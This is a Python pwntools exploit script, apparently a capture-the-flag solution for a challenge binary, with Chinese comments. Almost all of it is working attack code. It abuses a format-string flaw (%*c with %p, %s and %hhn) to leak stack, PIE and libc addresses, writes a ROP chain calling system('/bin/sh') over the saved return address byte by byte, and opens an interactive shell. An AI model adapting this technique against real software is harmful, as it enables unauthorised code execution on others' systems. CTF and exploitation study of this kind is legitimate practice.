import argparse
import sys

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument(
    "mode",
    type=int,
    choices=[0, 1, 2],
    nargs="?",
    default=0,
    help="0=local,1=local+gdb,2=remote",
)
args = parser.parse_args()

filename = "./chall"
libc_name = "./libc.so.6"
arch = "amd64"
remote_addr = "localhost"
remote_port = "13337"
log.level = "info"

context(os="linux", arch=arch)  
if args.mode < 2:
    context.terminal = ["tmux", "splitw", "-h"]

def VIO_TEXT(x, code=95):
    return log.info(f"\x1b[{code}m{x}\x1b[0m")

def CLEAR_TEXT(x, code=32):
    return log.success(f"\x1b[{code}m{x}\x1b[0m")

if args.mode == 0:
    io = process(filename)
    print(CLEAR_TEXT("[*] Running on local machine"))
elif args.mode == 1:
    io = process(filename)
    gdb.attach(
        io,
        gdbscript="""
        """,
    )
elif args.mode == 2:
    io = remote(remote_addr, remote_port)
else:
    sys.exit(1)
elf = ELF(filename, checksec=False)
if libc_name:
    libc = ELF(libc_name, checksec=False)
else:
    libc=elf.libc


def send_payload(n_args, args_list, fmt_str):
    io.sendlineafter(b"# of args: ", str(n_args).encode())
    # 填充 args 数组
    for i in range(n_args):
        io.sendlineafter(f"args[{i}]: ".encode(), str(args_list[i]).encode())
    io.sendlineafter(b"Format string: ", fmt_str)


def write_byte(addr, val):
    """
    使用 %*c%hhn 写入 1 字节
    args[0] = 写入值 (width)
    args[1] = 0 (char)
    args[2] = 目标地址 (pointer)
    """
    # 如果要写入 0x00，必须输出 0x100 (256) 个字符，%hhn 截断为 0x00 from小伞
    if val == 0:
        val = 256

    # args[0] = width/value, args[1] = char, args[2] = pointer
    args_write = [val, 0, addr, 0]

    # 构造 Payload: %*c 消耗 args[0], args[1]； %hhn 消耗 args[2]
    # n_args=3 或 4 均可 (我们用 4)
    send_payload(4, args_write, b"%*c%hhn")


# Leak Addresses libc and PIE
VIO_TEXT("Sending payload to leak addresses...")

# 1. Leak Stack Address (使用 3个 %*c 跳过 Nil from RocketMadev blog)
# 预期打印 Arg 7 ([RSP+16] 或附近)
args_leak_stack = [3, 0, 0, 0]
fmt_stack = b"AAAA%*c%*c%*c%p"
send_payload(4, args_leak_stack, fmt_stack)
io.recvuntil(b"AAAA")
io.recvuntil(b"0x")
stack_leak = int(io.recvline().strip(), 16)
CLEAR_TEXT(f"Leaked stack address: {hex(stack_leak)}")

# Arb Read
store_pie_addr = stack_leak - 0x20
args_leak_pie = [0, 0, store_pie_addr, 0]
payload_pie = b"B%*c%sEND"
send_payload(4, args_leak_pie, payload_pie)
io.recvuntil(b"B")
raw_leak_pie = io.recvuntil(b"END", drop=True)
raw_leak_pie = raw_leak_pie.lstrip(b"\x00").strip()
raw_leak_pie = u64(raw_leak_pie[:7].ljust(8, b"\x00"))
pie_base = raw_leak_pie - 0x12F6
CLEAR_TEXT(f"Calculated PIE base address: {hex(pie_base)}")

# Leak Libc 
store_libc_addr = stack_leak + 0x170
args_leak_libc = [0, 0, store_libc_addr, 0]
payload_libc = b"B%*c%sEND"
send_payload(4, args_leak_libc, payload_libc)
io.recvuntil(b"B")
raw_leak_libc = io.recvuntil(b"END", drop=True)
raw_leak_libc = raw_leak_libc.lstrip(b"\x00").strip()
raw_leak_libc = u64(raw_leak_libc[:7].ljust(8, b"\x00"))
# pause()
libc_base = (
    raw_leak_libc - 0x2718a 
)  # __libc_start_call_main+122 的偏移,要微调一下
CLEAR_TEXT(f"Calculated Libc base address: {hex(libc_base)}")

# ROP payload
VIO_TEXT("Constructing ROP chain...")

# 计算返回地址位置
OFFSET_TO_RET = 0x170
ret_addr_ptr = stack_leak + OFFSET_TO_RET
CLEAR_TEXT(f"ROP Chain Start Ptr: {hex(ret_addr_ptr)}")

pop_rdi_ret = pie_base + 0x1282
CLEAR_TEXT(f"pop rdi; ret address: {hex(pop_rdi_ret)}")

bin_sh_addr = libc_base + 0x0000000000196031
CLEAR_TEXT(f"/bin/sh address: {hex(bin_sh_addr)}")
system_addr = libc_base + 0x4C330
exit_addr = libc_base + libc.sym["exit"] 
ret_addr = pie_base + 0x101A
CLEAR_TEXT(f"system address: {hex(system_addr)}")
ROP_CHAIN = [
    pop_rdi_ret,  
    bin_sh_addr,  
    ret_addr,
    system_addr,
]
VIO_TEXT("Writing ROP Chain byte-by-byte...")

current_write_ptr = ret_addr_ptr

for addr in ROP_CHAIN:
    for i in range(8):
        byte_to_write = (addr >> (8 * i)) & 0xFF  # 对齐用

        # 写入
        write_byte(current_write_ptr + i, byte_to_write)

    # 移动到下一个地址的起始点
    current_write_ptr += 8

CLEAR_TEXT("ROP Chain written successfully.")

VIO_TEXT("Triggering the overwritten return address...")

# pause()
# 发送非数字字符，使 scanf 失败，main 函数 return，触发 ROP 链
io.sendlineafter(b"# of args: ", b"#")

io.interactive()
